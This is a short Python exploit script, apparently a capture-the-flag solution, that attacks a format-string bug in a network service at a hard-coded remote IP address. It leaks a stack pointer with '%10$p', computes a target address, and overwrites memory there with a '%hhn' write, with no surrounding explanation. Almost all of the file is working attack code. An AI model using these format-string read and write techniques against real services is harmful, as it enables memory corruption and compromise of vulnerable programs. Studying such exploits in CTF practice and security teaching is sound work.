import socket
import readline

host = '127.0.0.1'
port = 9000
host = '120.114.62.211'
port = 6131

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
  # TODO
  res = s.recv(4096)
  print(f'[<] {info if info else ""}')
  print(res)
  return res

def send(data):
  print(b'[>] ' + data)
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()

def round(payload, sure):
  recv()
  send(payload)
  recv()
  res = recv()
  # recv()
  # recv()
  send(b'Y' if sure else b'N')
  return res

# Get stack address
stack_adr  = round(b'%10$p', False).split(b'\n')[0]
secret_adr = int(stack_adr, 16) - 0xf4 + (4*4 if host != '127.0.0.1' else 0) # 4*4 is the remote offset
print(f'Target address: {secret_adr:#02x}')

# Write 0xab37 to secret
payload  = b'deadbeef'*2
payload += secret_adr.to_bytes(8, 'little')
round(payload, False)

payload = b'%55c%10$hhn'
round(payload, False)

# Check secret value
round(b'%11$p', True)

recv(1024)
